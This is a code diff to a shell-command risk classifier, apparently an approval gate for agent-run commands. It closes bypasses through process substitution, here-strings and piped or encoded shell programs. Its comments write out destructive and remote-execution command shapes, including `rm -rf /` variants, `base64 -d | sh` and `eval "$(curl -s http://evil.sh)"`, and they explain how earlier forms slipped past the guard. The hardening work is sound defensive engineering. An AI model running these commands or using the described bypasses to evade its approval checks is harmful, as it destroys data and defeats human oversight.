@@ -118,7 +118,18 @@ export const DEFAULT_REQUIRE_APPROVAL: string[] = [
 const SHELL_EXECS = new Set(["bash", "sh", "zsh", "dash", "ksh", "ash", "fish", "su"]);
 
 /** Execs whose arguments are executable text (a remote command, a script). */
-const EVAL_EXECS = new Set(["eval", "exec", "ssh", "sshpass", "xargs"]);
+const EVAL_EXECS = new Set([
+  // `trap 'cmd' EXIT` registers a command string that runs when the shell
+  // LEAVES. The payload is an ordinary quoted operand, so without this it is
+  // redacted as prose exactly as `echo "..."` correctly is. The deferral
+  // changes the deny message and the audit trail, not the decision. (rf-zvll A2)
+  "trap",
+  "eval",
+  "exec",
+  "ssh",
+  "sshpass",
+  "xargs",
+]);
 
 /** Flags carrying an executable string (`bash -c`, `python -c`, `mysql -e`, `find -exec`). */
 const EVAL_FLAGS = new Set(["-c", "-e", "--command", "--execute", "--eval", "-exec", "--exec"]);
@@ -142,6 +153,13 @@ const TEXT_FLAGS = new Set([
 const CHAIN_OPS = new Set([";", "&&", "||", "|", "&"]);
 
 /** Operators whose following token is a redirect target (a path — never data). */
+// `<<<` is deliberately ABSENT: it is a here-STRING, and its operand is stdin
+// CONTENT, not a path. Treating it as a redirect target left the text
+// untouched, which over-blocked a data owner (`cat <<< "…rm -rf /…" > notes.md`
+// classified critical — #230's shape, one operator over) and under-blocked a
+// shell one (`bash <<< "rm -rf /"` classified high, though the shell runs it).
+// Falling through to the ordinary operand path asks the question the heredoc
+// work already answers: does this command execute what it reads? (sable-4nt2)
 const REDIRECT_OPS = new Set([">", ">>", "<", "<<"]);
 
 /** Bound on recursion through nested shell wrappers / substitutions. */
@@ -211,6 +229,25 @@ function tokenize(s: string): { pieces: Piece[]; unterminated: boolean } {
     // operator branch below so it becomes a statement separator (rf-6pqx).
     if (/\s/.test(c) && c !== "\n" && c !== "\r") { i++; continue; }
 
+    // `<(cmd)` / `>(cmd)` — PROCESS SUBSTITUTION. The content is a command that
+    // RUNS, exactly as `$(cmd)` does, so it goes in substs and the existing
+    // recursive scan handles it with no new rule.
+    //
+    // Without this the tokenizer never forms the construct: it emits op `<`,
+    // which is in REDIRECT_OPS, so `(cmd` becomes a redirect TARGET and is left
+    // untouched, while the remaining words are redacted as the host's data
+    // operands. TWO independent wrong decisions that conspire —
+    // `ack <(rm -rf /)` sanitized to `ack <(rm    `, harmless-looking head
+    // preserved and dangerous tail deleted. Fixing either alone leaves the
+    // bypass, which is worth knowing when reviewing this. (rf-zvll)
+    if ((c === "<" || c === ">") && s[i + 1] === "(") {
+      const start = i;
+      const r = readSubst(s, i);
+      i = r.next;
+      pieces.push({ start, end: i, op: null, text: "", quoted: false, substs: [r.inner] });
+      continue;
+    }
+
     if (isOpChar(c)) {
       const start = i;
       if (c === "\n" || c === "\r") {
@@ -220,7 +257,16 @@ function tokenize(s: string): { pieces: Piece[]; unterminated: boolean } {
         continue;
       }
       const two = s.slice(i, i + 2);
-      const op = (two === "&&" || two === "||" || two === ">>" || two === "<<") ? two : c;
+      // `<<<` before `<<`, or it tokenizes as `<<` + `<` and the here-string
+      // operand becomes a redirect target — left untouched, which is how it
+      // ended up both over- and under-blocked (sable-4nt2).
+      const three = s.slice(i, i + 3);
+      const op =
+        three === "<<<"
+          ? three
+          : (two === "&&" || two === "||" || two === ">>" || two === "<<")
+            ? two
+            : c;
       i += op.length;
       pieces.push({ start, end: i, op, text: op, quoted: false, substs: [] });
       continue;
@@ -836,6 +882,79 @@ function disarmsRafter(command: string, depth = 0): boolean {
   return statements.some(statementDisarmsRafter);
 }
 
+/**
+ * True if a SHELL receives its program through a channel rather than as a path.
+ *
+ * rf-zvll mechanism B. Three shapes, all measured EXECUTING by the sandboxed
+ * oracle while classifying `low`:
+ *
+ *     cat payload.txt | sh          the payload is in a file
+ *     echo <b64> | base64 -d | sh   the payload is encoded
+ *     bash < payload.txt            no pipe at all, just a redirect
+ *
+ * The classifier cannot read any of them, so no amount of better parsing
+ * recovers the payload — this is a POSTURE decision, not an analysis one.
+ *
+ * DELIBERATELY EXCLUDES a plain file ARGUMENT (`bash deploy.sh`). We cannot read
+ * that either, so the distinction is not one of RISK — it is one of FREQUENCY,
+ * and saying so plainly matters more than dressing it up. Measured over 13,613
+ * intercepted commands: stream forms are 0.022% of traffic in 2 of 665 repos,
+ * while `curl|wget` into a shell — already approval-gated — is 100 events. The
+ * form that already prompts is 33x more common than everything this newly
+ * gates. That sample is ONE machine; the limit is recorded on rf-zvll.
+ */
+export function shellProgramFromStream(command: string): boolean {
+  const { pieces } = tokenize(command);
+  const segments: Piece[][] = [];
+  const enders: (string | null)[] = [];
+  let cur: Piece[] = [];
+  for (const piece of pieces) {
+    if (piece.op !== null && CHAIN_OPS.has(piece.op)) {
+      segments.push(cur); enders.push(piece.op); cur = [];
+      continue;
+    }
+    cur.push(piece);
+  }
+  segments.push(cur); enders.push(null);
+
+  // Iterative, not one step: `env FOO=1 bash` needs two skips, and a single
+  // lookahead silently resolved to `FOO=1` — caught by its own test row.
+  const resolve = (seg: Piece[]): string => {
+    const words = seg.filter((w) => w.op === null);
+    for (let k = 0; k < words.length; k++) {
+      const t = words[k].text;
+      if (ENV_ASSIGNMENT.test(t) || t.startsWith("-")) continue;
+      if (TAIL_WRAPPERS.has(execName(t))) continue;
+      return execName(t);
+    }
+    return "";
+  };
+
+  for (let idx = 0; idx < segments.length; idx++) {
+    const seg = segments[idx];
+    // `eval "$(cat f)"` / `eval "$(curl -s http://x)"` — a program-executing
+    // consumer fed from a substitution whose OUTPUT we cannot read. Same
+    // semantic test as the pipe case; pipe-vs-substitution is syntax.
+    //
+    // Deliberately ANY substitution, not only data-readers: a reader-only rule
+    // misses `eval "$(curl -s http://evil.sh)"`, remote code and the worst
+    // shape in the set. Measured cost of the broad rule: ZERO occurrences in
+    // 13,647 commands across 671 repos.
+    if (EVAL_EXECS.has(resolve(seg)) && seg.some((w) => w.op === null && w.substs.length)) {
+      return true;
+    }
+    if (SHELL_EXECS.has(resolve(seg))) {
+      // `bash < file` / `bash <<< str` — the program arrives on stdin.
+      for (const w of seg) if (w.op === "<" || w.op === "<<<") return true;
+    }
+    // `… | bash` — this segment's OUTPUT is the next one's program.
+    if (enders[idx] === "|" && idx + 1 < segments.length) {
+      if (SHELL_EXECS.has(resolve(segments[idx + 1]))) return true;
+    }
+  }
+  return false;
+}
+
 export function assessCommandRisk(command: string): CommandRiskLevel {
   // rf-vnxs: checked on the RAW command, before sanitization, because the
   // disarm is an ordinary well-formed invocation — there is nothing malformed
@@ -848,6 +967,11 @@ export function assessCommandRisk(command: string): CommandRiskLevel {
   for (const pattern of CRITICAL_PATTERNS) {
     if (pattern.test(cmd)) return "critical";
   }
+  // rf-zvll B2: a shell fed its program from a channel we cannot read requires
+  // approval. Checked AFTER critical so `echo 'rm -rf /' | sh` — where the
+  // payload IS readable and matches — keeps its hard block rather than being
+  // softened to approval.
+  if (shellProgramFromStream(command)) return "high";
   for (const pattern of HIGH_PATTERNS) {
     if (pattern.test(cmd)) return "high";
   }
